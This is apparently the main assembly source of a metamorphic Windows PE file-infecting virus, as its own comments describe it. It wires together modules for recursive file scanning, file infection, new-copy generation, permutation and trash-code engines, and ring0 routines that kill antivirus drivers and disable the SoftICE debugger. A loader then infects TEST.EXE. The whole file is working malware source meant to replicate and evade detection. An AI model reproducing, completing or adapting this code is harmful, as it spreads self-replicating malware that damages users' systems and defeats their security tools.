
;DEBUG                  equ     ?

CODESIZE                equ     16384   ; 32k <-- size of permutating buffer
MAXMEM                  equ     40000h  ; 256k
DATA_RVA                equ     2000h   ; .data RVA

INFILESIZE              equ     65536   ; 64k<-- max size in file
M_C1                    equ     16384   ; [decryptor]
M_C2                    equ     CODESIZE; [encrypted body]
;                                         [decrypted body]
M_C3                    equ     16384   ; [vars]

include                 mz.inc          ; mz header
include                 pe.inc          ; pe header
include                 seh.inc         ; seh macros
include                 s2c.inc         ; string->code conversion macros

include                 MACHO\codegen.equ

pusho                   macro   lbl ; push offset of the procedure 'lbl'
                        local   __tmp ; ***CANT BE USED TO GET REAL OFFSET***
                        call    __tmp
                        jmp     lbl
__tmp:                  endm

                        p386
                        model   flat
                        locals  __

                        .data   ; contains the virus. should be at .DATA_RVA

start:

include                 import.inc              ; import stuff
include                 infect.inc              ; file infecting
include                 fioexlow.inc            ; file io
include                 gencopy.inc             ; new copy generation
include                 lde32bin.inc            ; LDE32 (disassembler)
include                 rpme_asm.inc            ; RPME -- constants
include                 rpme-krn.inc            ; RPME -- kernel
include                 rpme-mut.inc            ; RPME -- mutator
include                 usermut.inc             ; external mutator
include                 rnd.inc                 ; randomer
include                 startup.inc             ; startup code
include                 onexec.inc              ; onexec()
include                 recserch.inc            ; file scanning

include                 ETG\etg.inc             ; ETG (Trash Generator)
include                 PRCG\prcg.inc           ; PRCG (Cycle Generator)
include                 MACHO\codegen.inc       ; MACHO -- code generator
include                 MACHO\macho.inc         ; MACHO -- engine

include                 RING0\ring0.inc         ; r0 -- enter (threadcontext)
include                 RING0\fuckice.inc       ; r0 -- fuckup s-ice
include                 RING0\killavxd.inc      ; r0 -- kill av vxds

                        org     start+CODESIZE

xx_first:               import_main 2

patch_start             dd      ?
patch_eip               dd      ?

randseed                dd      ?

ldetbl                  db      2048 dup (?)

buf_size                dd      ?
buf_entry               dd      ?
buf_ptr                 dd      ?

out_size                dd      ?
out_entry               dd      ?
out_ptr                 dd      ?

mem_count               dd      ?
mem_ptr                 dd      ?

ff                      ff_struc ?

kavxd_killhandler       dd      ?
save_cs                 dd      ?
save_eip                dd      ?
save_esp                dd      ?

use_macho               db      ?

macho_start             dd      ?
m_encr                  db      256 dup (?)

DATASIZE                equ     ($-start+4095) and (not 4095)

                        .code   ; contains virus loader

loader:
                        call    init_win32api
                        call    init_memory
                        call    randomize

                        lea     edx, testfile
                        call    infect_file

                        push    -1
                        extern  ExitProcess:PROC
                        call    ExitProcess

testfile                db      'TEST.EXE',0

                        end     loader
